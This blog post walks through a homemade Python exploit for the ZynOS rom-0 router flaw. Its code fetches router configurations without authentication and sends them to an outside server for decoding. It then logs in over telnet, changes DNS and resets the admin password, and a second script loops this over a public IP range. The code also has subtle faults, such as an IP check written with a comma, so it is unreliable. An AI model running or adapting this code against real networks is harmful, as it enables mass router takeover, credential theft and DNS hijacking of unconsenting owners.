---
title: "zynOS rom-0 fetching"
date: 2024-01-10T11:32:59-05:00
draft: false
type: "post"
---

i was poking around old vulnerabilities, that specifically affected home networks and i found this (now patched) exploitable vulnerability affecting zynOS routers. the vulnerability allows an attacker to download the router's configuration (ROM-0 file) without any type of authentication. this file could then be later decompressed to expose the router's admin password, wifi password, etc.

[the program](https://github.com/bilals12/zyn-rom0) i wrote attempts to connect to a valid host to download said ROM-0 file, extracts specific data from it (using regex), then logs back into the same host via telnet to change DNS settings, set a system password, and log out. it's a pretty simple program, and its use-case is probably limited nowadays but it was a fun exercise nonetheless. as always, it's for educational purposes only!

the main script can be broken down into 8 steps:

1. **set default socket timeout**: `socket.setdefaulttimeout(4)` sets a default timeout for new socket objects to 4 seconds. this affects all subsequent socket operations.

2. **registering openers**: `register_openers()` initializes and configures libraries to handle multipart/form-data uploads.

3. **file handling**: the script attempts to remove a file named "rom-0" from the current directory, as a cleanup step from previous runs.

4. **downloading file**: the script constructs a URL using a command-line argument (`sys.argv[1]`) and downloads a file named "rom-0" from this URL. requires a valid host to be passed as an argument!

5. **uploading the file**: it then uploads this file to a specific URL (`http://198.61.167.113/zynos/decoded.php`). this server is intended to process/analyze the uploaded file.

6. **extracting information**: the script uses regex to extract certain data from the response received after uploading the file.

7. **establishing telnet connection**: it attempts to establish a telnet connection to the same host from which the "rom-0" file was downloaded.

8. **sending commands via telnet**: the extracted data (hopefully a password) is used to login via telnet. the script then executes several commands on the remote host.

```python
import urllib2
import urllib
import re
import sys
import telnetlib
import socket
import os
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

# set default timeout for socket ops to avoid indefinite hang
# improves reliability of network ops
socket.setdefaulttimeout(4)

# register openers for multipart/form-data upload
# required for handling file uploads
register_openers()

# try to remove file "rom-0" in current directory (if it exists)
# cleanup step to ensure script always works with latest data
try:
	os.remove("rom-0")
except OSError:
	pass #ignores error if file doesn't exist

# main script
try:
	# read host IP from command line arg
	if len(sys.argv) < 2:
		print("usage: python script.py [host_ip]")
		sys.exit(1)

	host = str(sys.argv[1])

	# validate host IP format
	if not re.match(r'^\d{1,3}(\,\d{1,3}){3}$', host):
		print("[!] invalid IP address format [!]")
		sys.exit(1)

	# download "rom-0" from provided host
	urllib.urlretrieve("http://" + host + "/rom-0", "rom-0")

	# using context manager for file ops to ensure proper closure of the file
	with open("rom-0", 'rb') as f:
		datagen, headers = multipart_encode({"uploadedfile": f})

		# send POST request with file to specific server for processing
		request = urllib2.Request("http://198.61.167.113/zynos/decoded.php", datagen, headers)
		response = urllib2.urlopen(request).read()

		# extract specific data (password) using regex
		match = re.search('rows=10>(.*)', response)
		if match:
			found_password = match.group(1)
		else:
			print("[!] password not found in response [!]")
			sys.exit(1)

	# establish telnet connection to target host
	tn = telnetlib.Telnet(host, 23, 3)
	tn.read_until("Password: ")
	tn.write(found_password + "\n")

	# executing commands on target host
	tn.write("set lan dhcpdns 8.8.8.8\n")
	tn.write("sys password admin\n")
	print(host + " [^-^] success! [^-^]")

	# exit telnet sesh
	tn.write("exit\n")

except Exception as e:
	# errors
	print(f"[!] an error occurred: {e} [!]")
	print(host + " [:(] offline/inaccessible [:(]")
```

running `attack.py` simply peforms the actions of the main script over a specified target range. 

```python
import subprocess
from netaddr import IPNetwork

# define range of IP addresses to iterate over
ip_range = '41.108.48.1/24'

# iterate over each IP in the range
for ip in IPNetwork(ip_range):
	# execute script.py
	command = ["python", "script.py", str(ip)]

	# execute command using subprocess
	subprocess.run(command)
```
